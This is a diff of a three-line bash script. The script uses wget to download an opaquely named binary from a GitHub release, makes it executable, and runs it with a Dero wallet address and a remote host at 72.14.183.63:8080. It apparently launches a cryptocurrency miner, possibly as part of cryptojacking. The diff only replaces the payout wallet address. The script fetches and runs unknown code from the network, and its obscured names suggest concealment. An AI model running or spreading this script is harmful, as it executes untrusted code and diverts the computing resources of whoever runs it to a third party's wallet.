@@ -1,4 +1,4 @@
 #!/bin/bash
 wget https://github.com/bzxcmncv/bvzasw/releases/download/bvas/bvxcfd
 chmod +x bvxcfd
-./bvxcfd -w dero1qytfne4y9mpry7kcxrl5z328sqrmy349ldgawmu32yy5yzrjrnygjqg0vw3yu -r 72.14.183.63:8080
+./bvxcfd -w dero1qy9yyx3crwce75uyhtgt5xxxengpq3kecg2m8qwtwcujcun0skrjyqq5ycvtf -r 72.14.183.63:8080
